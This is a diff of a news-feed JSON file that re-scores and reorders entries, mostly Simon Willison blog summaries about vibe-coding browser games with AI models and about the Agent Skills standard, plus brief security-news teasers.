       "source_type": "news",
@@ -1689,11 +1689,11 @@
       "id": "7976b553b90c8592",
       "kev": false,
       "published": "2026-11-09T23:58:46Z",
-      "score": 34.3,
+      "score": 33.8,
       "score_reasons": [
         "source:Simon Willison (+6)",
         "watchlist:llm (+15)",
-        "recency (+13.3)"
+        "recency (+12.8)"
       ],
       "source": "Simon Willison",
       "source_type": "news",
@@ -1713,11 +1713,11 @@
       "id": "268febaf67e13c76",
       "kev": false,
       "published": "2026-10-27T14:29:26Z",
-      "score": 33.5,
+      "score": 33.4,
       "score_reasons": [
         "source:PortSwigger Research (+15)",
         "watchlist:javascript (+15)",
-        "recency (+3.5)"
+        "recency (+3.4)"
       ],
       "source": "PortSwigger Research",
       "source_type": "research",
@@ -1737,11 +1737,11 @@
       "id": "6db6b1e39d6a161d",
       "kev": false,
       "published": "2026-10-27T07:00:00Z",
-      "score": 33.4,
+      "score": 33.3,
       "score_reasons": [
         "source:Project Zero (+15)",
         "watchlist:javascript,llm (+15)",
-        "recency (+3.4)"
+        "recency (+3.3)"
       ],
       "source": "Project Zero",
       "source_type": "research",
@@ -1762,11 +1762,11 @@
       "id": "2d5e4247e860f350",
       "kev": false,
       "published": "2026-11-09T04:32:33Z",
-      "score": 33.3,
+      "score": 32.8,
       "score_reasons": [
         "source:Simon Willison (+6)",
         "watchlist:javascript (+15)",
-        "recency (+12.3)"
+        "recency (+11.8)"
       ],
       "source": "Simon Willison",
       "source_type": "news",
@@ -1854,11 +1854,11 @@
       "id": "41ad409b13a7a12e",
       "kev": false,
       "published": "2026-11-04T15:26:02Z",
-      "score": 28.8,
+      "score": 28.5,
       "score_reasons": [
         "source:Simon Willison (+6)",
         "watchlist:llm (+15)",
-        "recency (+7.8)"
+        "recency (+7.5)"
       ],
       "source": "Simon Willison",
       "source_type": "news",
@@ -1878,11 +1878,11 @@
       "id": "0eaac3789b3995de",
       "kev": false,
       "published": "2026-11-03T21:41:42Z",
-      "score": 28.3,
+      "score": 28.0,
       "score_reasons": [
         "source:Simon Willison (+6)",
         "watchlist:llm (+15)",
-        "recency (+7.3)"
+        "recency (+7.0)"
       ],
       "source": "Simon Willison",
       "source_type": "news",
@@ -1902,11 +1902,11 @@
       "id": "950aded5fa9d1987",
       "kev": false,
       "published": "2026-11-03T16:29:48Z",
-      "score": 28.1,
+      "score": 27.9,
       "score_reasons": [
         "source:Simon Willison (+6)",
         "watchlist:llm (+15)",
-        "recency (+7.1)"
+        "recency (+6.9)"
       ],
       "source": "Simon Willison",
       "source_type": "news",
@@ -1926,11 +1926,11 @@
       "id": "86517b8f15c28848",
       "kev": false,
       "published": "2026-11-03T05:28:59Z",
-      "score": 27.8,
+      "score": 27.6,
       "score_reasons": [
         "source:Simon Willison (+6)",
         "watchlist:llm (+15)",
-        "recency (+6.8)"
+        "recency (+6.6)"
       ],
       "source": "Simon Willison",
       "source_type": "news",
@@ -1950,11 +1950,11 @@
       "id": "a7779c14f4a1edde",
       "kev": false,
       "published": "2026-11-02T23:49:30Z",
-      "score": 27.6,
+      "score": 27.4,
       "score_reasons": [
         "source:Simon Willison (+6)",
         "watchlist:python,llm (+15)",
-        "recency (+6.6)"
+        "recency (+6.4)"
       ],
       "source": "Simon Willison",
       "source_type": "news",
@@ -1976,11 +1976,11 @@
       "id": "7e0ea55829b36ed3",
       "kev": false,
       "published": "2026-10-01T00:00:00Z",
-      "score": 27.3,
+      "score": 27.2,
       "score_reasons": [
         "source:GitHub Security Lab (+12)",
         "watchlist:java (+15)",
-        "recency (+0.3)"
+        "recency (+0.2)"
       ],
       "source": "GitHub Security Lab",
       "source_type": "research",
@@ -2001,11 +2001,11 @@
       "id": "a0edeec9c181dd22",
       "kev": false,
       "published": "2026-11-01T23:24:22Z",
-      "score": 27.0,
+      "score": 26.8,
       "score_reasons": [
         "source:Simon Willison (+6)",
         "watchlist:python (+15)",
-        "recency (+6.0)"
+        "recency (+5.8)"
       ],
       "source": "Simon Willison",
       "source_type": "news",
@@ -2024,11 +2024,11 @@
       "id": "9590a7b9dd6aba1c",
       "kev": false,
       "published": "2026-10-31T22:10:01Z",
-      "score": 26.4,
+      "score": 26.2,
       "score_reasons": [
         "source:Simon Willison (+6)",
         "watchlist:llm (+15)",
-        "recency (+5.4)"
+        "recency (+5.2)"
       ],
       "source": "Simon Willison",
       "source_type": "news",
@@ -2048,11 +2048,11 @@
       "id": "15b96761d0c22ab8",
       "kev": false,
       "published": "2026-10-29T22:48:29Z",
-      "score": 25.4,
+      "score": 25.3,
       "score_reasons": [
         "source:Simon Willison (+6)",
         "watchlist:llm (+15)",
-        "recency (+4.4)"
+        "recency (+4.3)"
       ],
       "source": "Simon Willison",
       "source_type": "news",
@@ -2072,11 +2072,11 @@
       "id": "6d1ed7773e4f93b1",
       "kev": false,
       "published": "2026-10-29T14:06:27Z",
-      "score": 25.3,
+      "score": 25.1,
       "score_reasons": [
         "source:Simon Willison (+6)",
         "watchlist:mcp (+15)",
-        "recency (+4.3)"
+        "recency (+4.1)"
       ],
       "source": "Simon Willison",
       "source_type": "news",
@@ -2096,11 +2096,11 @@
       "id": "afba17402d80c8e4",
       "kev": false,
       "published": "2026-10-28T23:23:21Z",
-      "score": 25.0,
+      "score": 24.9,
       "score_reasons": [
         "source:Simon Willison (+6)",
         "watchlist:llm (+15)",
-        "recency (+4.0)"
+        "recency (+3.9)"
       ],
       "source": "Simon Willison",
       "source_type": "news",
@@ -2117,37 +2117,14 @@
       "cves": [],
       "epss": null,
       "feed": "news",
-      "id": "28d3ffbcd69019be",
-      "kev": false,
-      "published": "2026-10-28T13:55:15Z",
-      "score": 24.9,
-      "score_reasons": [
-        "source:Simon Willison (+6)",
-        "watchlist:javascript (+15)",
-        "recency (+3.9)"
-      ],
-      "source": "Simon Willison",
-      "source_type": "news",
-      "summary": "I've written before about how November 2025 was an inflection point for coding agents - the point where Opus 4.5 and GPT-5.1 crossed a tipping point that meant their respective coding agents became reliable daily drivers for software engineers. I think we've reached a new inflection point in October 2026, and this time it's for vibe coding computer games. Tree Appreciator Emberwick Battle Drones Pumpkin Farmer, aka Quarter Sun Cove Four times as insulting What happens if someone actually puts the work in? You should build a game! Claude Opus 5.5 in particular exhibits meaningful improvements in several areas needed to build a compelling game: 3D modeling Music generation (see Scrimshaw Jukebox) Game design (!) That last one is particularly important. Models have been able to create something that looks like a game for quite a while now, as seen in my previous experiments. The challenge has been getting to a game that's actually fun to play. Game design is a deep subject area. I won't pretend to be well versed in it - I know enough to have respect for it as a craft. Creating a novel, compelling gameplay loop which challenges players at the right level and provides a satisfying learning curve is a fine art. I didn't think the models could do it. Then I tried telling Claude Opus 5.5 to \"Make it a LOT more fun\"... and it did. In the past few weeks I've vibe coded (in the classic sense of the term - no looking at the code at all) four games that I've genuinely enjoyed playing. I attended Foo Camp in Berkeley over the weekend and met several people who were having similar experiences. Building games that play well is shockingly easy now. The new challenge is coming up with concepts for games that are novel and delightful and that wouldn't exist without AI assistance. I haven't done an exhaustive study, but my current impression is that GPT-6 Astra isn't quite there yet. It can absolutely build a game, but its sense of fun doesn't match that of Opus 5.5. I expect OpenAI will get there by the end of the year. Here are the four game projects that have convinced me that the models are now capable of producing fun games with very little guidance. All four are built in HTML and JavaScript and run entirely in the browser. Tree Appreciator The smallest game I found to be genuinely delightful is Tree Appreciator. I used the regular Claude chat interface for this - it didn't even need Claude Code. I built this on a whim while we were driving along Skyline Boulevard looking at trees. My prompt was: Build a three js game called \"Tree appreciator\" - it shows you two algorithmically generated trees and the game mechanics is about appreciating the differences between them. Think hard about how to make sure it is both fun and beautiful. I've found that telling models to use three.js works really well. Claude doesn't have its own image generation model but is capable of building full-color 3D models that look and feel excellent. This game required no iteration or follow-up prompting at all - I got the game in a single shot. It gave me back a charming little mobile-friendly spot-the-difference game. You can play that here. Here's the chat transcript that built it. It's pleasingly relaxing. The graphics are fun, and collecting trees that you have completed in a \"herbarium\" provides a nice, cosy sense of accomplishment. Emberwick This was a more ambitious project that I again built using regular Claude chat. I started out by building an experimental prototype of an engine for a top-down fantasy RPG: Build a demo game engine three.js which is a top down (but at an angle) RPG - the player gets to move through the world with one or two companions. Create a fantasy village setting that demonstrates walking around outside and then shows how when the player enters a building the wall between the player and the camera goes transparent so the user can see what is happening Add some NPCs and plenty of furniture and different types of building some with an upstairs - be creative, make it look great Here's that first version. It worked really well! I was inspired to increase my ambitions: Make it not so flat - the buildings are great but the landscape itself is completely flat at the moment, fix that Add basements to two of the buildings with a tunnel system joining them below the village Add the start of a rocky mountain on one side of the village containing a cave with a sleeping troll Here's that version. When that produced a good result, I decided to push it all the way: Now turn this into an actual game - quadruple the size of the playable area, introduce fun game mechanics, add a plot that isn't too cliche, some twists, a magic system, make it really good We're back to prompts like \"make it really good\" here! Asking for a plot that \"isn't too cliche\" seemed to work too - it's a bit cliché, but still novel enough that I enjoyed following the story. Unlike Tree Appreciator, this took quite a bit of additional playtesting and prompting to get to a finished version. This was mainly due to gameplay problems - things like a character not being in the right place to complete a quest because a different story element had caused them to move to another location. Here's that final game. It has a full story that takes about 15 minutes to play through. There's even an experimental level editor if you want to drop in your own houses, furniture, and landscape features. Once it was all working (and I'd iterated through some gameplay bugs), I played it through from start to finish and found myself emotionally affected by the ending! I'm somewhat embarrassed by this, because everything in this game - the graphics, the plot, the characters, the music, the dialog - came from the model. My creative input was pretty much just \"it's a fantasy village and there's a troll asleep in a cave\". Here's the full shared Claude chat in which I built this game. I also fed that same initial sequence of prompts through ChatGPT GPT-6 Pro. Here's the transcript and the finished game for comparison. It looks great, but I don't think it plays nearly as well. Battle Drones This is by far my most successful project, which I wrote about last week. It's a Command & Conquer-style Real-Time Strategy game where two robot armies (or four as of Saturday) build units, harvest scrap, and battle over territory. This is also the project that convinced me that Opus 5.5 knows what \"fun\" is. The first versions were built back in July using Claude Fable 5. It got me to a workable 2D Command & Conquer-style game, but it wasn't great to play. I prompted Opus 5.5 to \"Make it a LOT more fun\" and then later to \"Port this game to three.js\" and the game was transformed. There's a blow-by-blow account (prompts included) in my write-up. Today, Battle Drones has 2-4 player multiplayer (via a vibe coded WebSockets relay server), medals, replays, seven maps, a random map generator, and a set of \"mutators\" that add variants of the rules. It also lets different LLMs play against each other, using a mode where the game advances five seconds and then pauses to give different models time to interpret the new game state and line up their next set of commands. Here's a replay of Claude Haiku 5.5 vs. GPT-6 Luna: Battle Drones is a particularly good example of Opus 5.5's ability to create 3D models. This page lets you browse all of the models in the game. I released Battle Drones under the Apache 2.0 License last Tuesday. On Wednesday Gabriel Turpin released Panache (screenshots here), a fork of Battle Drones that reimagined the game for steampunk 1900s Belle Époque France, with new models and music and an animated intro sequence. Open source at work! Pumpkin Farmer, aka Quarter Sun Cove I live in Half Moon Bay, California, home of the annual Half Moon Bay Art and Pumpkin Festival, which includes a giant pumpkin weigh-off competition. I decided to try building a game that wasn't just a cheap imitation of something that already existed, so I set out to create a game about farming pumpkins, growing giant pumpkins, and handling the rush of the October pumpkin season. I called it \"Quarter Sun Cove\". I'm still iterating on this project, but it's shaping up quite nicely. It's a cosy farming simulator where you spend the year tending to your giant pumpkin and planting out regular-sized pumpkins for sale in October, then sell pumpkins during pumpkin season and enter your giant pumpkin in the weigh-off. Every character in it is a (vegetarian) animal. The mayor of the town is a pelican. You can be a pelican, skunk, raccoon, possum, beaver, coyote, fox, owl, sea otter, or harbor seal. Those species all later show up (accompanied by their children) to buy pumpkins from you. It's absurdly cute. You can play the latest version here. I'm not convinced by the game mechanics yet - it's actually quite complicated: you have to decide when to plant pumpkins such that they will become ripe at the weekends in October with the most visitors. Here's the initial brainstorming session, which resulted in this spec file. Then I had Opus 5.5 Ultracode burn millions of tokens and nearly two days building it. I told Claude to \"surprise and delight the user frequently\" and the result is so many little details and easter eggs. There are mischievous raccoons, an elephant seal that runs the weigh-off, harbor seals that roll their pumpkins back into the ocean, a wandering goat, and superstitions about growing giant pumpkins that sometimes come true. This isn't my best game yet - it's not as fun to play as Battle Drones - but it represents the kind of game I want more of: weird, fun, uniquely personal - something that wouldn't have been built in the before-times. Four times as insulting If you are offended by AI-generated art, AI-generated music, AI-generated writing, and AI-generated code, I have bad news for you: vibe coded games combine all of those at once. I respect those opinions, even though I don’t strongly hold them myself. The wider games community already has an aversion to AI-generated assets in games. This has been a growing issue over the past few years as tools like Midjourney have enabled developers to generate assets for their projects. This IGN story covering complaints about slop in Valve's Steam Next Fest is a good recent example. We now have games where everything - code, assets, dialog, and even the game design itself - can be outsourced to the models. And the results don't suck! Building a computer game used to be one of the most challenging projects in all of software development, combining a diverse range of skills and requiring intense focus and effort over many months or even years. And now here I am spitting out a playable multiplayer RTS by prompting on my phone! I expect that, as we've already seen with programming, this will result in a split. Some players will refuse to have anything to do with games that were built in this way. Others may embrace this as opening up game development to a much wider audience. I lean in that direction! I certainly won't be entering any of my vibe coded games in traditional game jams or competitions - I don't feel like I've earned that right. We'll likely see new avenues emerge for vibe game developers to compare their projects. What happens if someone actually puts the work in? The thing I find both exciting and shameful about this is that I have got interesting results from so little creative input. The projects I've described here are loosely ordered by how much effort I've put into them. Not a single project represents more than four hours of my work (plus many more hours of Claude Code churning away by itself). Now imagine what could be achieved by anyone who takes this seriously, invests significant creative time, applies better taste in game design, and then playtests and iterates on the result until it's as good as they can make it. I want to see games that wouldn't have existed without these new tools. You should build a game! Building games in this way is so much fun. It's the perfect application for vibe coding because it's so low stakes: how much damage can you cause with a bug in a personal vibe coded game project? (OK, you can do some damage... my attempt at audio-based multiplayer gave my wife Natalie a nasty headache!) All of my games so far have been HTML and JavaScript using static hosting (generally GitHub Pages or Cloudflare Pages). Modern browsers - including mobile browsers - are incredibly capable. Frontier models already know libraries like three.js and Phaser. I'm finding these mobile web games to be indistinguishable from the native experience, at least for the kinds of games I'm trying to build. I suggest starting with a prompt like this: Build a mobile-friendly three.js game where... This works on both chatgpt.com and claude.ai - you don't even need to fire up a full coding agent. As one last example, here's \"Build a mobile-friendly three.js game where a mouse has to hide from a cat\" by Claude Opus 5.5 Extra and by GPT-6 Extra High. Switch to Codex or Claude Code once your project passes the proof-of-concept phase. And if the game isn't fun enough, add this: Make it a LOT more fun Tags: game-design, games, ai, generative-ai, chatgpt, llms, claude, vibe-coding, claude-code",
-      "tags": [
-        "watchlist"
-      ],
-      "title": "The October inflection point for vibe game development",
-      "url": "https://simonwillison.net/2026/Oct/28/vibe-game-development/"
-    },
-    {
-      "appsec": false,
-      "cves": [],
-      "epss": null,
-      "feed": "news",
       "id": "503762475e8ae5ab",
       "kev": false,
       "published": "2026-10-28T16:45:23Z",
-      "score": 24.9,
+      "score": 24.8,
       "score_reasons": [
         "source:Simon Willison (+6)",
         "watchlist:llm (+15)",
-        "recency (+3.9)"
+        "recency (+3.8)"
       ],
       "source": "Simon Willison",
       "source_type": "news",
@@ -2164,14 +2141,37 @@
       "cves": [],
       "epss": null,
       "feed": "news",
+      "id": "28d3ffbcd69019be",
+      "kev": false,
+      "published": "2026-10-28T13:55:15Z",
+      "score": 24.7,
+      "score_reasons": [
+        "source:Simon Willison (+6)",
+        "watchlist:javascript (+15)",
+        "recency (+3.7)"
+      ],
+      "source": "Simon Willison",
+      "source_type": "news",
+      "summary": "I've written before about how November 2025 was an inflection point for coding agents - the point where Opus 4.5 and GPT-5.1 crossed a tipping point that meant their respective coding agents became reliable daily drivers for software engineers. I think we've reached a new inflection point in October 2026, and this time it's for vibe coding computer games. Tree Appreciator Emberwick Battle Drones Pumpkin Farmer, aka Quarter Sun Cove Four times as insulting What happens if someone actually puts the work in? You should build a game! Claude Opus 5.5 in particular exhibits meaningful improvements in several areas needed to build a compelling game: 3D modeling Music generation (see Scrimshaw Jukebox) Game design (!) That last one is particularly important. Models have been able to create something that looks like a game for quite a while now, as seen in my previous experiments. The challenge has been getting to a game that's actually fun to play. Game design is a deep subject area. I won't pretend to be well versed in it - I know enough to have respect for it as a craft. Creating a novel, compelling gameplay loop which challenges players at the right level and provides a satisfying learning curve is a fine art. I didn't think the models could do it. Then I tried telling Claude Opus 5.5 to \"Make it a LOT more fun\"... and it did. In the past few weeks I've vibe coded (in the classic sense of the term - no looking at the code at all) four games that I've genuinely enjoyed playing. I attended Foo Camp in Berkeley over the weekend and met several people who were having similar experiences. Building games that play well is shockingly easy now. The new challenge is coming up with concepts for games that are novel and delightful and that wouldn't exist without AI assistance. I haven't done an exhaustive study, but my current impression is that GPT-6 Astra isn't quite there yet. It can absolutely build a game, but its sense of fun doesn't match that of Opus 5.5. I expect OpenAI will get there by the end of the year. Here are the four game projects that have convinced me that the models are now capable of producing fun games with very little guidance. All four are built in HTML and JavaScript and run entirely in the browser. Tree Appreciator The smallest game I found to be genuinely delightful is Tree Appreciator. I used the regular Claude chat interface for this - it didn't even need Claude Code. I built this on a whim while we were driving along Skyline Boulevard looking at trees. My prompt was: Build a three js game called \"Tree appreciator\" - it shows you two algorithmically generated trees and the game mechanics is about appreciating the differences between them. Think hard about how to make sure it is both fun and beautiful. I've found that telling models to use three.js works really well. Claude doesn't have its own image generation model but is capable of building full-color 3D models that look and feel excellent. This game required no iteration or follow-up prompting at all - I got the game in a single shot. It gave me back a charming little mobile-friendly spot-the-difference game. You can play that here. Here's the chat transcript that built it. It's pleasingly relaxing. The graphics are fun, and collecting trees that you have completed in a \"herbarium\" provides a nice, cosy sense of accomplishment. Emberwick This was a more ambitious project that I again built using regular Claude chat. I started out by building an experimental prototype of an engine for a top-down fantasy RPG: Build a demo game engine three.js which is a top down (but at an angle) RPG - the player gets to move through the world with one or two companions. Create a fantasy village setting that demonstrates walking around outside and then shows how when the player enters a building the wall between the player and the camera goes transparent so the user can see what is happening Add some NPCs and plenty of furniture and different types of building some with an upstairs - be creative, make it look great Here's that first version. It worked really well! I was inspired to increase my ambitions: Make it not so flat - the buildings are great but the landscape itself is completely flat at the moment, fix that Add basements to two of the buildings with a tunnel system joining them below the village Add the start of a rocky mountain on one side of the village containing a cave with a sleeping troll Here's that version. When that produced a good result, I decided to push it all the way: Now turn this into an actual game - quadruple the size of the playable area, introduce fun game mechanics, add a plot that isn't too cliche, some twists, a magic system, make it really good We're back to prompts like \"make it really good\" here! Asking for a plot that \"isn't too cliche\" seemed to work too - it's a bit cliché, but still novel enough that I enjoyed following the story. Unlike Tree Appreciator, this took quite a bit of additional playtesting and prompting to get to a finished version. This was mainly due to gameplay problems - things like a character not being in the right place to complete a quest because a different story element had caused them to move to another location. Here's that final game. It has a full story that takes about 15 minutes to play through. There's even an experimental level editor if you want to drop in your own houses, furniture, and landscape features. Once it was all working (and I'd iterated through some gameplay bugs), I played it through from start to finish and found myself emotionally affected by the ending! I'm somewhat embarrassed by this, because everything in this game - the graphics, the plot, the characters, the music, the dialog - came from the model. My creative input was pretty much just \"it's a fantasy village and there's a troll asleep in a cave\". Here's the full shared Claude chat in which I built this game. I also fed that same initial sequence of prompts through ChatGPT GPT-6 Pro. Here's the transcript and the finished game for comparison. It looks great, but I don't think it plays nearly as well. Battle Drones This is by far my most successful project, which I wrote about last week. It's a Command & Conquer-style Real-Time Strategy game where two robot armies (or four as of Saturday) build units, harvest scrap, and battle over territory. This is also the project that convinced me that Opus 5.5 knows what \"fun\" is. The first versions were built back in July using Claude Fable 5. It got me to a workable 2D Command & Conquer-style game, but it wasn't great to play. I prompted Opus 5.5 to \"Make it a LOT more fun\" and then later to \"Port this game to three.js\" and the game was transformed. There's a blow-by-blow account (prompts included) in my write-up. Today, Battle Drones has 2-4 player multiplayer (via a vibe coded WebSockets relay server), medals, replays, seven maps, a random map generator, and a set of \"mutators\" that add variants of the rules. It also lets different LLMs play against each other, using a mode where the game advances five seconds and then pauses to give different models time to interpret the new game state and line up their next set of commands. Here's a replay of Claude Haiku 5.5 vs. GPT-6 Luna: Battle Drones is a particularly good example of Opus 5.5's ability to create 3D models. This page lets you browse all of the models in the game. I released Battle Drones under the Apache 2.0 License last Tuesday. On Wednesday Gabriel Turpin released Panache (screenshots here), a fork of Battle Drones that reimagined the game for steampunk 1900s Belle Époque France, with new models and music and an animated intro sequence. Open source at work! Pumpkin Farmer, aka Quarter Sun Cove I live in Half Moon Bay, California, home of the annual Half Moon Bay Art and Pumpkin Festival, which includes a giant pumpkin weigh-off competition. I decided to try building a game that wasn't just a cheap imitation of something that already existed, so I set out to create a game about farming pumpkins, growing giant pumpkins, and handling the rush of the October pumpkin season. I called it \"Quarter Sun Cove\". I'm still iterating on this project, but it's shaping up quite nicely. It's a cosy farming simulator where you spend the year tending to your giant pumpkin and planting out regular-sized pumpkins for sale in October, then sell pumpkins during pumpkin season and enter your giant pumpkin in the weigh-off. Every character in it is a (vegetarian) animal. The mayor of the town is a pelican. You can be a pelican, skunk, raccoon, possum, beaver, coyote, fox, owl, sea otter, or harbor seal. Those species all later show up (accompanied by their children) to buy pumpkins from you. It's absurdly cute. You can play the latest version here. I'm not convinced by the game mechanics yet - it's actually quite complicated: you have to decide when to plant pumpkins such that they will become ripe at the weekends in October with the most visitors. Here's the initial brainstorming session, which resulted in this spec file. Then I had Opus 5.5 Ultracode burn millions of tokens and nearly two days building it. I told Claude to \"surprise and delight the user frequently\" and the result is so many little details and easter eggs. There are mischievous raccoons, an elephant seal that runs the weigh-off, harbor seals that roll their pumpkins back into the ocean, a wandering goat, and superstitions about growing giant pumpkins that sometimes come true. This isn't my best game yet - it's not as fun to play as Battle Drones - but it represents the kind of game I want more of: weird, fun, uniquely personal - something that wouldn't have been built in the before-times. Four times as insulting If you are offended by AI-generated art, AI-generated music, AI-generated writing, and AI-generated code, I have bad news for you: vibe coded games combine all of those at once. I respect those opinions, even though I don’t strongly hold them myself. The wider games community already has an aversion to AI-generated assets in games. This has been a growing issue over the past few years as tools like Midjourney have enabled developers to generate assets for their projects. This IGN story covering complaints about slop in Valve's Steam Next Fest is a good recent example. We now have games where everything - code, assets, dialog, and even the game design itself - can be outsourced to the models. And the results don't suck! Building a computer game used to be one of the most challenging projects in all of software development, combining a diverse range of skills and requiring intense focus and effort over many months or even years. And now here I am spitting out a playable multiplayer RTS by prompting on my phone! I expect that, as we've already seen with programming, this will result in a split. Some players will refuse to have anything to do with games that were built in this way. Others may embrace this as opening up game development to a much wider audience. I lean in that direction! I certainly won't be entering any of my vibe coded games in traditional game jams or competitions - I don't feel like I've earned that right. We'll likely see new avenues emerge for vibe game developers to compare their projects. What happens if someone actually puts the work in? The thing I find both exciting and shameful about this is that I have got interesting results from so little creative input. The projects I've described here are loosely ordered by how much effort I've put into them. Not a single project represents more than four hours of my work (plus many more hours of Claude Code churning away by itself). Now imagine what could be achieved by anyone who takes this seriously, invests significant creative time, applies better taste in game design, and then playtests and iterates on the result until it's as good as they can make it. I want to see games that wouldn't have existed without these new tools. You should build a game! Building games in this way is so much fun. It's the perfect application for vibe coding because it's so low stakes: how much damage can you cause with a bug in a personal vibe coded game project? (OK, you can do some damage... my attempt at audio-based multiplayer gave my wife Natalie a nasty headache!) All of my games so far have been HTML and JavaScript using static hosting (generally GitHub Pages or Cloudflare Pages). Modern browsers - including mobile browsers - are incredibly capable. Frontier models already know libraries like three.js and Phaser. I'm finding these mobile web games to be indistinguishable from the native experience, at least for the kinds of games I'm trying to build. I suggest starting with a prompt like this: Build a mobile-friendly three.js game where... This works on both chatgpt.com and claude.ai - you don't even need to fire up a full coding agent. As one last example, here's \"Build a mobile-friendly three.js game where a mouse has to hide from a cat\" by Claude Opus 5.5 Extra and by GPT-6 Extra High. Switch to Codex or Claude Code once your project passes the proof-of-concept phase. And if the game isn't fun enough, add this: Make it a LOT more fun Tags: game-design, games, ai, generative-ai, chatgpt, llms, claude, vibe-coding, claude-code",
+      "tags": [
+        "watchlist"
+      ],
+      "title": "The October inflection point for vibe game development",
+      "url": "https://simonwillison.net/2026/Oct/28/vibe-game-development/"
+    },
+    {
+      "appsec": false,
+      "cves": [],
+      "epss": null,
+      "feed": "news",
       "id": "ddec6cb5a4e152e9",
       "kev": false,
       "published": "2026-10-26T23:53:07Z",
-      "score": 24.3,
+      "score": 24.2,
       "score_reasons": [
         "source:Simon Willison (+6)",
         "watchlist:llm (+15)",
-        "recency (+3.3)"
+        "recency (+3.2)"
       ],
       "source": "Simon Willison",
       "source_type": "news",
@@ -2191,11 +2191,11 @@
       "id": "bcd7360bb2139689",
       "kev": false,
       "published": "2026-10-26T16:15:00Z",
-      "score": 24.2,
+      "score": 24.1,
       "score_reasons": [
         "source:Simon Willison (+6)",
         "watchlist:javascript (+15)",
-        "recency (+3.2)"
+        "recency (+3.1)"
       ],
       "source": "Simon Willison",
       "source_type": "news",
@@ -2214,11 +2214,11 @@
       "id": "880e8544b15f9e13",
       "kev": false,
       "published": "2026-10-23T19:40:54Z",
-      "score": 23.4,
+      "score": 23.3,
       "score_reasons": [
         "source:Simon Willison (+6)",
         "watchlist:llm (+15)",
-        "recency (+2.4)"
+        "recency (+2.3)"
       ],
       "source": "Simon Willison",
       "source_type": "news",
@@ -2229,30 +2229,6 @@
       ],
       "title": "Introducing Kimi K3.1 Pro",
       "url": "https://simonwillison.net/2026/Oct/23/kimi-k31-pro/"
-    },
-    {
-      "appsec": false,
-      "cves": [],
-      "epss": null,
-      "feed": "news",
-      "id": "4cb6db05cf9cb349",
-      "kev": false,
-      "published": "2026-10-22T18:09:56Z",
-      "score": 23.2,
-      "score_reasons": [
-        "source:Simon Willison (+6)",
-        "watchlist:model context protocol,mcp (+15)",
-        "recency (+2.2)"
-      ],
-      "source": "Simon Willison",
-      "source_type": "news",
-      "summary": "Donating Agent Skills to the Agentic AI Foundation News today from Anthropic: We’re committed to keeping Agent Skills open, community-driven, and vendor-neutral. Today, we are donating the standard to the Agentic AI Foundation (AAIF) under the Linux Foundation, which we co-founded with Block and OpenAI last year, and to which we donated the Model Context Protocol (MCP). I'm pleased to note I called this one last December, when Anthropic first declared skills to be an \"open standard\": I wouldn't be surprised to see this end up in the AAIF, recently the new home of the MCP specification. Fun side note: since my blog content is available to Claude via the datasette-mcp plugin I found that post by prompting Claude to \"Use simonwillison.net MCP to find if I ever talked about how I want skills to be donated to a standards body\". Tags: standards, ai, generative-ai, llms, anthropic, model-context-protocol, skills",
-      "tags": [
-        "watchlist",
-        "AI-sec"
-      ],
-      "title": "Donating Agent Skills to the Agentic AI Foundation",
-      "url": "https://simonwillison.net/2026/Oct/22/donating-agent-skills/"
     },
     {
       "appsec": false,
@@ -2283,22 +2259,24 @@
       "cves": [],
       "epss": null,
       "feed": "news",
-      "id": "8c9e2cbcfb0c13c2",
+      "id": "4cb6db05cf9cb349",
       "kev": false,
-      "published": "2026-11-04T15:12:29Z",
-      "score": 22.8,
+      "published": "2026-10-22T18:09:56Z",
+      "score": 23.1,
       "score_reasons": [
-        "source:PortSwigger Research (+15)",
-        "recency (+7.8)"
+        "source:Simon Willison (+6)",
+        "watchlist:model context protocol,mcp (+15)",
+        "recency (+2.1)"
       ],
-      "source": "PortSwigger Research",
-      "source_type": "research",
-      "summary": "You can now escalate HTTP header injection to a CRLF-Powered Desync and exploit it to serve random users a redirect to your collaborator, in a single prompt. We’ve just introduced a new scan check for",
+      "source": "Simon Willison",
+      "source_type": "news",
+      "summary": "Donating Agent Skills to the Agentic AI Foundation News today from Anthropic: We’re committed to keeping Agent Skills open, community-driven, and vendor-neutral. Today, we are donating the standard to the Agentic AI Foundation (AAIF) under the Linux Foundation, which we co-founded with Block and OpenAI last year, and to which we donated the Model Context Protocol (MCP). I'm pleased to note I called this one last December, when Anthropic first declared skills to be an \"open standard\": I wouldn't be surprised to see this end up in the AAIF, recently the new home of the MCP specification. Fun side note: since my blog content is available to Claude via the datasette-mcp plugin I found that post by prompting Claude to \"Use simonwillison.net MCP to find if I ever talked about how I want skills to be donated to a standards body\". Tags: standards, ai, generative-ai, llms, anthropic, model-context-protocol, skills",
       "tags": [
-        "research"
+        "watchlist",
+        "AI-sec"
       ],
-      "title": "Making HTTP header injection critical with one prompt",
-      "url": "https://portswigger.net/research/making-http-header-injection-critical-with-one-prompt"
+      "title": "Donating Agent Skills to the Agentic AI Foundation",
+      "url": "https://simonwillison.net/2026/Oct/22/donating-agent-skills/"
     },
     {
       "appsec": false,
@@ -2308,11 +2286,11 @@
       "id": "c6ac92b5dc7c111b",
       "kev": false,
       "published": "2026-10-20T19:34:19Z",
-      "score": 22.8,
+      "score": 22.7,
       "score_reasons": [
         "source:Simon Willison (+6)",
         "watchlist:javascript,typescript,llm (+15)",
-        "recency (+1.8)"
+        "recency (+1.7)"
       ],
       "source": "Simon Willison",
       "source_type": "news",
@@ -2329,44 +2307,22 @@
       "cves": [],
       "epss": null,
       "feed": "news",
-      "id": "5ba1e262888374fc",
+      "id": "8c9e2cbcfb0c13c2",
       "kev": false,
-      "published": "2026-11-11T01:59:09Z",
-      "score": 22.8,
-      "score_reasons": [
-        "source:Risky Bulletin (+8)",
-        "recency (+14.8)"
-      ],
-      "source": "Risky Bulletin",
-      "source_type": "news",
-      "summary": "France blames Iran for supermarket freezer hacks, the White House nominates Palantir’s CISO as CISA director, another Russian cloud provider gets hacked, and N-able takes down its SaaS platform after a researcher discloses 33 vulnerabilities in it. Show notes Risky Bulletin: France blames Iran for the October supermarket fridge hacks",
-      "tags": [],
-      "title": "Risky Bulletin: France blames Iran for supermarket freezer hacks",
-      "url": "https://risky.biz/RBNEWS632/"
-    },
-    {
-      "appsec": false,
-      "cves": [],
-      "epss": null,
-      "feed": "news",
-      "id": "64f79924a918dd64",
-      "kev": false,
-      "published": "2026-10-18T23:16:16Z",
+      "published": "2026-11-04T15:12:29Z",
       "score": 22.5,
       "score_reasons": [
-        "source:Simon Willison (+6)",
-        "watchlist:llm (+15)",
-        "recency (+1.5)"
+        "source:PortSwigger Research (+15)",
+        "recency (+7.5)"
       ],
